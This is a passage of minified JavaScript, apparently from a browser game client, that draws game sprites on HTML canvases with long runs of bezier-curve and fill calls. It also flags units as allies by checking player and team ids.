                    r.globalAlpha = .5,
                    r.save(),
                    r.translate(91.21426391601562 * e, 67.35713195800781 * e),
                    Ve(r, -56 * e, -55 * e, 115 * e, 109 * e, 15 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.save(),
                    r.translate(91.21426391601562 * e, 67.35713195800781 * e),
                    Ve(r, -56 * e, -55 * e, 115 * e, 109 * e, 15 * e),
                    r.restore(),
                    he(r, void 0, i[1], 7 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(131.21426391601562 * e, 70.35713195800781 * e),
                    r.bezierCurveTo(133.21426391601562 * e, 95.35713195800781 * e, 128.21426391601562 * e, 109.35713195800781 * e, 108.21426391601562 * e, 108.35713195800781 * e),
                    he(r, void 0, i[1], 10 * e),
                    n
            }
            function u0(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 163 * e,
                    n.height = 163 * e,
                    r.save(),
                    r.translate(82.5 * e, 81.1015625 * e),
                    r.rotate(0),
                    Ve(r, -65.5 * e, -66 * e, 131 * e, 131 * e, 5 * e),
                    r.restore(),
                    he(r, i[1]),
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(5 * e, 5 * e),
                    r.save(),
                    r.translate(80 * e, 17.1015625 * e),
                    Ve(r, -64 * e, -4.5 * e, 129 * e, 9 * e, 5 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(-5 * e, -5 * e),
                    r.save(),
                    r.translate(80 * e, 17.1015625 * e),
                    Ve(r, -64 * e, -4.5 * e, 129 * e, 9 * e, 5 * e),
                    r.restore(),
                    he(r, i[2], i[3], 3 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(5 * e, 5 * e),
                    r.save(),
                    r.translate(145.5 * e, 83.6015625 * e),
                    Ve(r, -4.5 * e, -61 * e, 9 * e, 129 * e, 5 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(-5 * e, -5 * e),
                    r.save(),
                    r.translate(145.5 * e, 83.6015625 * e),
                    Ve(r, -4.5 * e, -61 * e, 9 * e, 129 * e, 5 * e),
                    r.restore(),
                    he(r, i[2], i[3], 3 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(5 * e, 5 * e),
                    r.save(),
                    r.translate(17.5 * e, 82.6015625 * e),
                    Ve(r, -4.5 * e, -65 * e, 9 * e, 129 * e, 5 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(-5 * e, -5 * e),
                    r.save(),
                    r.translate(17.5 * e, 82.6015625 * e),
                    Ve(r, -4.5 * e, -65 * e, 9 * e, 129 * e, 5 * e),
                    r.restore(),
                    he(r, i[2], i[3], 3 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(5 * e, 5 * e),
                    r.save(),
                    r.translate(80.5 * e, 145.6015625 * e),
                    Ve(r, -65.5 * e, -4 * e, 129 * e, 9 * e, 5 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(-5 * e, -5 * e),
                    r.save(),
                    r.translate(80.5 * e, 145.6015625 * e),
                    Ve(r, -65.5 * e, -4 * e, 129 * e, 9 * e, 5 * e),
                    r.restore(),
                    he(r, i[2], i[3], 3 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(5 * e, 5 * e),
                    r.save(),
                    r.translate(17 * e, 18.1015625 * e),
                    Ve(r, -11 * e, -11.5 * e, 22 * e, 22 * e, 5 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(-5 * e, -5 * e),
                    r.save(),
                    r.translate(17 * e, 18.1015625 * e),
                    Ve(r, -11 * e, -11.5 * e, 22 * e, 22 * e, 5 * e),
                    r.restore(),
                    he(r, i[2], i[3], 3 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(5 * e, 5 * e),
                    r.save(),
                    r.translate(145.5 * e, 16.6015625 * e),
                    Ve(r, -10.5 * e, -11.5 * e, 21 * e, 22 * e, 5 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(-5 * e, -5 * e),
                    r.save(),
                    r.translate(145.5 * e, 16.6015625 * e),
                    Ve(r, -10.5 * e, -11.5 * e, 21 * e, 22 * e, 5 * e),
                    r.restore(),
                    he(r, i[2], i[3], 3 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(5 * e, 5 * e),
                    r.save(),
                    r.translate(145.5 * e, 144.1015625 * e),
                    Ve(r, -10.5 * e, -11 * e, 22 * e, 22 * e, 5 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(-5 * e, -5 * e),
                    r.save(),
                    r.translate(145.5 * e, 144.1015625 * e),
                    Ve(r, -10.5 * e, -11 * e, 22 * e, 22 * e, 5 * e),
                    r.restore(),
                    he(r, i[2], i[3], 3 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(5 * e, 5 * e),
                    r.save(),
                    r.translate(17.5 * e, 145.1015625 * e),
                    Ve(r, -11.5 * e, -12 * e, 22 * e, 22 * e, 5 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(-5 * e, -5 * e),
                    r.save(),
                    r.translate(17.5 * e, 145.1015625 * e),
                    Ve(r, -11.5 * e, -12 * e, 22 * e, 22 * e, 5 * e),
                    r.restore(),
                    he(r, i[2], i[3], 3 * e),
                    n
            }
            function d0(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 168 * e,
                    n.height = 100 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(10 * e, 5 * e),
                    r.save(),
                    r.translate(24.5 * e, 44.30000305175781 * e),
                    Ve(r, -19.5 * e, -8.5 * e, 39 * e, 17 * e, 10 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(115 * e, 37.80000305175781 * e),
                    r.bezierCurveTo(142 * e, 37.80000305175781 * e, 140 * e, 37.80000305175781 * e, 141 * e, 37.80000305175781 * e),
                    r.bezierCurveTo(147 * e, 28.800003051757812 * e, 149 * e, 26.800003051757812 * e, 153 * e, 32.80000305175781 * e),
                    r.bezierCurveTo(160 * e, 42.80000305175781 * e, 157 * e, 50.80000305175781 * e, 153 * e, 58.80000305175781 * e),
                    r.bezierCurveTo(148 * e, 62.80000305175781 * e, 147 * e, 59.80000305175781 * e, 143 * e, 52.80000305175781 * e),
                    r.bezierCurveTo(129 * e, 52.80000305175781 * e, 129 * e, 52.80000305175781 * e, 115 * e, 52.80000305175781 * e),
                    r.closePath(),
                    he(r, i[0]),
                    ke(r, 78 * e, 44.80000305175781 * e, 39.44616584663204 * e),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(-10 * e, -5 * e),
                    r.save(),
                    r.translate(24.5 * e, 44.30000305175781 * e),
                    Ve(r, -19.5 * e, -8.5 * e, 39 * e, 17 * e, 10 * e),
                    r.restore(),
                    he(r, void 0, i[3], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(115 * e, 37.80000305175781 * e),
                    r.bezierCurveTo(142 * e, 37.80000305175781 * e, 140 * e, 37.80000305175781 * e, 141 * e, 37.80000305175781 * e),
                    r.bezierCurveTo(147 * e, 28.800003051757812 * e, 149 * e, 26.800003051757812 * e, 153 * e, 32.80000305175781 * e),
                    r.bezierCurveTo(160 * e, 42.80000305175781 * e, 157 * e, 50.80000305175781 * e, 153 * e, 58.80000305175781 * e),
                    r.bezierCurveTo(148 * e, 62.80000305175781 * e, 147 * e, 59.80000305175781 * e, 143 * e, 52.80000305175781 * e),
                    r.bezierCurveTo(129 * e, 52.80000305175781 * e, 129 * e, 52.80000305175781 * e, 115 * e, 52.80000305175781 * e),
                    r.closePath(),
                    he(r, void 0, i[3], 6 * e),
                    ke(r, 78 * e, 44.80000305175781 * e, 42.44616584663204 * e),
                    he(r, void 0, i[3], 6 * e),
                    r.save(),
                    r.translate(24.5 * e, 44.30000305175781 * e),
                    Ve(r, -19.5 * e, -8.5 * e, 39 * e, 17 * e, 10 * e),
                    r.restore(),
                    he(r, i[1]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(115 * e, 37.80000305175781 * e),
                    r.bezierCurveTo(142 * e, 37.80000305175781 * e, 140 * e, 37.80000305175781 * e, 141 * e, 37.80000305175781 * e),
                    r.bezierCurveTo(147 * e, 28.800003051757812 * e, 149 * e, 26.800003051757812 * e, 153 * e, 32.80000305175781 * e),
                    r.bezierCurveTo(160 * e, 42.80000305175781 * e, 157 * e, 50.80000305175781 * e, 153 * e, 58.80000305175781 * e),
                    r.bezierCurveTo(148 * e, 62.80000305175781 * e, 147 * e, 59.80000305175781 * e, 143 * e, 52.80000305175781 * e),
                    r.bezierCurveTo(129 * e, 52.80000305175781 * e, 129 * e, 52.80000305175781 * e, 115 * e, 52.80000305175781 * e),
                    r.closePath(),
                    he(r, i[1]),
                    ke(r, 78 * e, 44.80000305175781 * e, 39.44616584663204 * e),
                    he(r, i[2], i[1], 4 * e),
                    ke(r, 78 * e, 44.80000305175781 * e, 29.68164415931166 * e),
                    he(r, i[3], i[1], 4 * e),
                    ke(r, 78 * e, 44 * e, 20 * e),
                    he(r, i[4]),
                    n
            }
            let T0 = {
                x: null,
                y: null
            };
            function A0(e) {
                for (var t = 0; t < xe.team.length; t++)
                    if (xe.team[t] == e)
                        return 1;
                return 0
            }
            function h0() {
                for (let e = 0; e < Fe.units[0].length; e++)
                    Fe.units[0][e].ally = xe.id === Fe.units[0][e].pid || A0(Fe.units[0][e].pid);
                for (let e = 0; e < Fe.units[4].length; e++)
                    Fe.units[4][e].ally = xe.id === Fe.units[4][e].pid || A0(Fe.units[4][e].pid);
                for (let e = 0; e < Fe.units[7].length; e++)
                    Fe.units[7][e].ally = xe.id === Fe.units[7][e].pid || A0(Fe.units[7][e].pid);
                for (let e = 0; e < Fe.units[8].length; e++)
                    Fe.units[8][e].ally = xe.id === Fe.units[8][e].pid || A0(Fe.units[8][e].pid);
                for (let e = 0; e < Fe.units[9].length; e++)
                    Fe.units[9][e].ally = xe.id === Fe.units[9][e].pid || A0(Fe.units[9][e].pid);
                for (let e = 0; e < Fe.units[19].length; e++)
                    Fe.units[19][e].ally = xe.id === Fe.units[19][e].pid || A0(Fe.units[19][e].pid);
                for (let e = 0; e < Fe.units[50].length; e++)
                    Fe.units[50][e].ally = xe.id === Fe.units[50][e].pid || A0(Fe.units[50][e].pid);
                for (let e = 0; e < Fe.units[5].length; e++)
                    Fe.units[5][e].ally = xe.id === Fe.units[5][e].pid || A0(Fe.units[5][e].pid);
                for (let e = 0; e < Fe.units[12].length; e++)
                    Fe.units[12][e].ally = xe.id === Fe.units[12][e].pid || A0(Fe.units[12][e].pid);
                for (let e = 0; e < Fe.units[13].length; e++)
                    Fe.units[13][e].ally = xe.id === Fe.units[13][e].pid || A0(Fe.units[13][e].pid);
                for (let e = 0; e < Fe.units[14].length; e++)
                    Fe.units[14][e].ally = xe.id === Fe.units[14][e].pid || A0(Fe.units[14][e].pid);
                for (let e = 0; e < Fe.units[20].length; e++)
                    Fe.units[20][e].ally = xe.id === Fe.units[20][e].pid || A0(Fe.units[20][e].pid);
                for (let e = 0; e < Fe.units[52].length; e++)
                    Fe.units[52][e].ally = xe.id === Fe.units[52][e].pid || A0(Fe.units[52][e].pid);
                for (let e = 0; e < Fe.units[45].length; e++)
                    Fe.units[45][e].ally = xe.id === Fe.units[45][e].pid || A0(Fe.units[45][e].pid);
                for (let e = 0; e < Fe.units[46].length; e++)
                    Fe.units[46][e].ally = xe.id === Fe.units[46][e].pid || A0(Fe.units[46][e].pid);
                for (let e = 0; e < Fe.units[47].length; e++)
                    Fe.units[47][e].ally = xe.id === Fe.units[47][e].pid || A0(Fe.units[47][e].pid);
                for (let e = 0; e < Fe.units[48].length; e++)
                    Fe.units[48][e].ally = xe.id === Fe.units[48][e].pid || A0(Fe.units[48][e].pid);
                for (let e = 0; e < Fe.units[49].length; e++)
                    Fe.units[49][e].ally = xe.id === Fe.units[49][e].pid || A0(Fe.units[49][e].pid);
                for (let e = 0; e < Fe.units[53].length; e++)
                    Fe.units[53][e].ally = xe.id === Fe.units[53][e].pid || A0(Fe.units[53][e].pid);
                for (let e = 0; e < Fe.units[10].length; e++)
                    Fe.units[10][e].ally = xe.id === Fe.units[10][e].pid || A0(Fe.units[10][e].pid);
                for (let e = 0; e < Fe.units[15].length; e++)
                    Fe.units[15][e].ally = xe.id === Fe.units[15][e].pid || A0(Fe.units[15][e].pid);
                for (let e = 0; e < Fe.units[16].length; e++)
                    Fe.units[16][e].ally = xe.id === Fe.units[16][e].pid || A0(Fe.units[16][e].pid);
                for (let e = 0; e < Fe.units[17].length; e++)
                    Fe.units[17][e].ally = xe.id === Fe.units[17][e].pid || A0(Fe.units[17][e].pid);
                for (let e = 0; e < Fe.units[21].length; e++)
                    Fe.units[21][e].ally = xe.id === Fe.units[21][e].pid || A0(Fe.units[21][e].pid);
                for (let e = 0; e < Fe.units[51].length; e++)
                    Fe.units[51][e].ally = xe.id === Fe.units[51][e].pid || A0(Fe.units[51][e].pid);
                for (let e = 0; e < Fe.units[11].length; e++)
                    Fe.units[11][e].ally = xe.id === Fe.units[11][e].pid || A0(Fe.units[11][e].pid)
            }
            function l0(e) {
                return xe.team[0] === e
            }
            function I0(e) {
                var t = new Image;
                return t.src = e.toDataURL("image/png"),
                    t.width = e.width,
                    t.height = e.height,
                    t.isLoaded = 1,
                    t
            }
            function c0(e, t, i, n) {
                for (var r = 2 * Math.PI / t, o = (e.beginPath(),
                    [{
                        x: i,
                        y: 0
                    }]), a = [], s = 1; s < t; s++) {
                    o.push({
                        x: Math.cos(s * r) * i,
                        y: Math.sin(s * r) * i
                    });
                    var _ = o.length;
                    a.push(Utils.middle_point(o[_ - 2], o[_ - 1]))
                }
                a.push(Utils.middle_point(o[o.length - 1], o[0]));
                var E = a[a.length - 1];
                e.moveTo(E.x, E.y);
                for (var u = 0; u < t; u++)
                    e.arcTo(o[u].x, o[u].y, a[u].x, a[u].y, n);
                e.closePath()
            }
            function O0(e, t, i, n) {
                t && (e.fillStyle = t,
                    e.fill()),
                    i && (e.lineWidth = n,
                        e.strokeStyle = i,
                        e.stroke())
            }
            function g0(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                n.width = 170 * e,
                    n.height = 170 * e,
                    r.translate(0, 3 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.save(),
                    r.translate(85 * e, 95 * e),
                    r.rotate(1.4),
                    c0(r, 7, 60 * e, 10 * e),
                    r.restore(),
                    O0(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(85 * e, 82 * e);
                for (var o = 0; o < 10; o++)
                    r.rotate(Math.PI / 5),
                        r.save(),
                        r.translate(65 * e, 0),
                        c0(r, 3, 21 * e, 4 * e),
                        O0(r, i[1], i[2], 4 * e),
                        r.restore();
                return r.save(),
                    r.translate(0 * e, 0 * e),
                    r.rotate(.2),
                    c0(r, 9, 60 * e, 10 * e),
                    O0(r, i[3], i[4], 4 * e),
                    r.rotate(-.32),
                    c0(r, 9, 38 * e, 10 * e),
                    O0(r, i[5], i[6], 4 * e),
                    r.rotate(.68),
                    c0(r, 9, 20 * e, 8 * e),
                    O0(r, i[7], i[8], 6 * e),
                    r.restore(),
                    n
            }
            function p0(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 158 * e,
                    n.height = 201 * e,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(96.5 * e, 76.421875 * e),
                    r.bezierCurveTo(100.5 * e, 64.421875 * e, 103.5 * e, 62.421875 * e, 110.5 * e, 65.421875 * e),
                    r.bezierCurveTo(116.5 * e, 66.421875 * e, 117.5 * e, 67.421875 * e, 112.5 * e, 73.421875 * e),
                    r.bezierCurveTo(107 * e, 79.921875 * e, 107 * e, 79.921875 * e, 101.5 * e, 86.421875 * e),
                    r.closePath(),
                    he(r, i[8], i[8], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(61.5 * e, 78.421875 * e),
                    r.bezierCurveTo(57.5 * e, 73.421875 * e, 51.5 * e, 66.421875 * e, 45.5 * e, 68.421875 * e),
                    r.bezierCurveTo(32.5 * e, 73.421875 * e, 38.5 * e, 75.421875 * e, 46.5 * e, 81.421875 * e),
                    r.bezierCurveTo(51.5 * e, 84.921875 * e, 51.5 * e, 84.921875 * e, 56.5 * e, 88.421875 * e),
                    r.closePath(),
                    he(r, i[8], i[8], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(116.5 * e, 127.421875 * e),
                    r.bezierCurveTo(124.5 * e, 108.421875 * e, 129.5 * e, 104.421875 * e, 141.5 * e, 107.421875 * e),
                    r.bezierCurveTo(156.5 * e, 112.421875 * e, 153.5 * e, 113.421875 * e, 132.5 * e, 134.421875 * e),
                    r.bezierCurveTo(123.5 * e, 141.921875 * e, 123.5 * e, 141.921875 * e, 114.5 * e, 149.421875 * e),
                    r.closePath(),
                    he(r, i[8], i[8], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(41.5 * e, 134.421875 * e),
                    r.bezierCurveTo(30.5 * e, 119.421875 * e, 25.5 * e, 111.421875 * e, 12.5 * e, 115.421875 * e),
                    r.bezierCurveTo(4.5 * e, 120.421875 * e, 4.5 * e, 121.421875 * e, 26.5 * e, 142.421875 * e),
                    r.bezierCurveTo(35 * e, 149.921875 * e, 35 * e, 149.921875 * e, 43.5 * e, 157.421875 * e),
                    r.closePath(),
                    he(r, i[8], i[8], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(78.5 * e, 51.921875 * e),
                    r.bezierCurveTo(99.5 * e, 75.921875 * e, 110.5 * e, 96.921875 * e, 118.5 * e, 120.921875 * e),
                    r.bezierCurveTo(121.5 * e, 140.921875 * e, 107.5 * e, 179.921875 * e, 75.5 * e, 183.921875 * e),
                    r.bezierCurveTo(30.5 * e, 169.921875 * e, 37.5 * e, 131.921875 * e, 34.5 * e, 120.921875 * e),
                    r.bezierCurveTo(41.5 * e, 89.921875 * e, 61.5 * e, 67.921875 * e, 78.5 * e, 51.921875 * e),
                    r.closePath(),
                    he(r, i[8], i[8], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(72.5 * e, 72.421875 * e),
                    r.bezierCurveTo(76.5 * e, 79.421875 * e, 79.5 * e, 80.421875 * e, 83.5 * e, 73.421875 * e),
                    r.bezierCurveTo(80.5 * e, 96.921875 * e, 79.5 * e, 114.421875 * e, 77.5 * e, 120.421875 * e),
                    r.closePath(),
                    he(r, i[8], i[8], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(42.5 * e, 163.421875 * e),
                    r.bezierCurveTo(62.5 * e, 185.421875 * e, 86.5 * e, 186.421875 * e, 111.5 * e, 165.421875 * e),
                    r.bezierCurveTo(107.5 * e, 176.421875 * e, 95.5 * e, 187.421875 * e, 75.5 * e, 188.421875 * e),
                    r.bezierCurveTo(53.5 * e, 188.421875 * e, 43.5 * e, 171.421875 * e, 42.5 * e, 164.421875 * e),
                    r.closePath(),
                    he(r, i[8], i[8], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(79.5 * e, 61.421875 * e),
                    r.bezierCurveTo(88.5 * e, 31.421875 * e, 81.5 * e, 16.421875 * e, 75.5 * e, 7.421875 * e),
                    r.bezierCurveTo(77.5 * e, 28.421875 * e, 77.5 * e, 37.421875 * e, 68.5 * e, 42.421875 * e),
                    r.bezierCurveTo(79.5 * e, 57.421875 * e, 79.5 * e, 58.421875 * e, 80.5 * e, 61.421875 * e),
                    r.closePath(),
                    he(r, i[8], i[8], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(72.5 * e, 72.421875 * e),
                    r.bezierCurveTo(76.5 * e, 79.421875 * e, 79.5 * e, 80.421875 * e, 83.5 * e, 73.421875 * e),
                    r.bezierCurveTo(80.5 * e, 96.921875 * e, 79.5 * e, 114.421875 * e, 77.5 * e, 120.421875 * e),
                    r.closePath(),
                    he(r, i[8], i[8], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(96.5 * e, 76.421875 * e),
                    r.bezierCurveTo(100.5 * e, 64.421875 * e, 103.5 * e, 62.421875 * e, 110.5 * e, 65.421875 * e),
                    r.bezierCurveTo(116.5 * e, 66.421875 * e, 117.5 * e, 67.421875 * e, 112.5 * e, 73.421875 * e),
                    r.bezierCurveTo(107 * e, 79.921875 * e, 107 * e, 79.921875 * e, 101.5 * e, 86.421875 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(61.5 * e, 78.421875 * e),
                    r.bezierCurveTo(57.5 * e, 73.421875 * e, 51.5 * e, 66.421875 * e, 45.5 * e, 68.421875 * e),
                    r.bezierCurveTo(32.5 * e, 73.421875 * e, 38.5 * e, 75.421875 * e, 46.5 * e, 81.421875 * e),
                    r.bezierCurveTo(51.5 * e, 84.921875 * e, 51.5 * e, 84.921875 * e, 56.5 * e, 88.421875 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(116.5 * e, 127.421875 * e),
                    r.bezierCurveTo(124.5 * e, 108.421875 * e, 129.5 * e, 104.421875 * e, 141.5 * e, 107.421875 * e),
                    r.bezierCurveTo(156.5 * e, 112.421875 * e, 153.5 * e, 113.421875 * e, 132.5 * e, 134.421875 * e),
                    r.bezierCurveTo(123.5 * e, 141.921875 * e, 123.5 * e, 141.921875 * e, 114.5 * e, 149.421875 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(41.5 * e, 134.421875 * e),
                    r.bezierCurveTo(30.5 * e, 119.421875 * e, 25.5 * e, 111.421875 * e, 12.5 * e, 115.421875 * e),
                    r.bezierCurveTo(4.5 * e, 120.421875 * e, 4.5 * e, 121.421875 * e, 26.5 * e, 142.421875 * e),
                    r.bezierCurveTo(35 * e, 149.921875 * e, 35 * e, 149.921875 * e, 43.5 * e, 157.421875 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(78.5 * e, 51.921875 * e),
                    r.bezierCurveTo(99.5 * e, 75.921875 * e, 110.5 * e, 96.921875 * e, 118.5 * e, 120.921875 * e),
                    r.bezierCurveTo(121.5 * e, 140.921875 * e, 107.5 * e, 179.921875 * e, 75.5 * e, 183.921875 * e),
                    r.bezierCurveTo(30.5 * e, 169.921875 * e, 37.5 * e, 131.921875 * e, 34.5 * e, 120.921875 * e),
                    r.bezierCurveTo(41.5 * e, 89.921875 * e, 61.5 * e, 67.921875 * e, 78.5 * e, 51.921875 * e),
                    r.closePath(),
                    he(r, i[3], i[2], 4 * e),
                    ke(r, 108.5 * e, 148.421875 * e, 9 * e),
                    he(r, i[5]),
                    ke(r, 106.5 * e, 144.421875 * e, 3 * e),
                    he(r, i[6]),
                    ke(r, 46.5 * e, 148.421875 * e, 9 * e),
                    he(r, i[5]),
                    ke(r, 44.5 * e, 144.421875 * e, 3 * e),
                    he(r, i[6]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(116.5 * e, 114.421875 * e),
                    r.bezierCurveTo(121.5 * e, 137.421875 * e, 118.5 * e, 133.421875 * e, 108.5 * e, 139.421875 * e),
                    r.bezierCurveTo(94.5 * e, 146.421875 * e, 96.5 * e, 148.421875 * e, 95.5 * e, 152.421875 * e),
                    he(r, i[3], i[2], 4 * e),
                    r.beginPath(),
                    r.translate(0, -2 * e),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(35.5 * e, 131.421875 * e),
                    r.bezierCurveTo(36.5 * e, 140.421875 * e, 39.5 * e, 140.421875 * e, 49.5 * e, 143.421875 * e),
                    r.bezierCurveTo(59.5 * e, 149.421875 * e, 57.5 * e, 151.421875 * e, 59.5 * e, 155.421875 * e),
                    he(r, i[3], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(84.5 * e, 57.421875 * e),
                    r.bezierCurveTo(101.5 * e, 120.421875 * e, 92.5 * e, 127.421875 * e, 78.5 * e, 134.421875 * e),
                    r.bezierCurveTo(51.5 * e, 131.421875 * e, 63.5 * e, 102.421875 * e, 70.5 * e, 59.421875 * e),
                    r.bezierCurveTo(75 * e, 55.421875 * e, 78.5 * e, 52.421875 * e, 79.5 * e, 51.421875 * e),
                    r.closePath(),
                    he(r, i[4]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(79.5 * e, 61.421875 * e),
                    r.bezierCurveTo(88.5 * e, 31.421875 * e, 81.5 * e, 16.421875 * e, 75.5 * e, 7.421875 * e),
                    r.bezierCurveTo(77.5 * e, 28.421875 * e, 77.5 * e, 37.421875 * e, 68.5 * e, 42.421875 * e),
                    r.bezierCurveTo(79.5 * e, 57.421875 * e, 79.5 * e, 58.421875 * e, 80.5 * e, 61.421875 * e),
                    r.closePath(),
                    he(r, i[3], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(72.5 * e, 72.421875 * e),
                    r.bezierCurveTo(76.5 * e, 79.421875 * e, 79.5 * e, 80.421875 * e, 83.5 * e, 73.421875 * e),
                    r.bezierCurveTo(80.5 * e, 96.921875 * e, 79.5 * e, 114.421875 * e, 77.5 * e, 120.421875 * e),
                    r.closePath(),
                    he(r, i[3], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(87.5 * e, 154.421875 * e),
                    r.bezierCurveTo(93.5 * e, 163.921875 * e, 93.5 * e, 163.921875 * e, 99.5 * e, 173.421875 * e),
                    r.bezierCurveTo(95 * e, 177.421875 * e, 95 * e, 177.421875 * e, 90.5 * e, 181.421875 * e),
                    r.bezierCurveTo(89 * e, 167.921875 * e, 89 * e, 167.921875 * e, 87.5 * e, 154.421875 * e),
                    r.closePath(),
                    he(r, i[6], i[7], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(81.5 * e, 164.421875 * e),
                    r.bezierCurveTo(84 * e, 172.921875 * e, 84 * e, 172.921875 * e, 86.5 * e, 181.421875 * e),
                    r.bezierCurveTo(82.5 * e, 182.421875 * e, 82.5 * e, 182.421875 * e, 78.5 * e, 183.421875 * e),
                    r.closePath(),
                    he(r, i[6], i[7], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(72.5 * e, 164.421875 * e),
                    r.bezierCurveTo(73.5 * e, 173.921875 * e, 73.5 * e, 173.921875 * e, 74.5 * e, 183.421875 * e),
                    r.bezierCurveTo(70.5 * e, 182.921875 * e, 70.5 * e, 182.921875 * e, 66.5 * e, 182.421875 * e),
                    r.closePath(),
                    he(r, i[6], i[7], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(65.5 * e, 156.421875 * e),
                    r.bezierCurveTo(65 * e, 168.421875 * e, 65 * e, 168.421875 * e, 64.5 * e, 180.421875 * e),
                    r.bezierCurveTo(58.5 * e, 177.421875 * e, 58.5 * e, 177.421875 * e, 52.5 * e, 174.421875 * e),
                    r.closePath(),
                    he(r, i[6], i[7], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(42.5 * e, 163.421875 * e),
                    r.bezierCurveTo(62.5 * e, 185.421875 * e, 86.5 * e, 186.421875 * e, 111.5 * e, 165.421875 * e),
                    r.bezierCurveTo(107.5 * e, 176.421875 * e, 95.5 * e, 187.421875 * e, 75.5 * e, 188.421875 * e),
                    r.bezierCurveTo(53.5 * e, 188.421875 * e, 43.5 * e, 171.421875 * e, 42.5 * e, 164.421875 * e),
                    r.closePath(),
                    he(r, i[3], i[2], 4 * e),
                    n
            }
            function R0(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 400 * e,
                    n.height = 170 * e,
                    r.translate(0, -170 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(159.5 * e, 322.0625 * e),
                    r.bezierCurveTo(240.5 * e, 293.0625 * e, 240.5 * e, 293.0625 * e, 321.5 * e, 264.0625 * e),
                    r.bezierCurveTo(276.5 * e, 230.0625 * e, 276.5 * e, 230.0625 * e, 231.5 * e, 196.0625 * e),
                    r.bezierCurveTo(158.5 * e, 221.5625 * e, 158.5 * e, 221.5625 * e, 85.5 * e, 247.0625 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
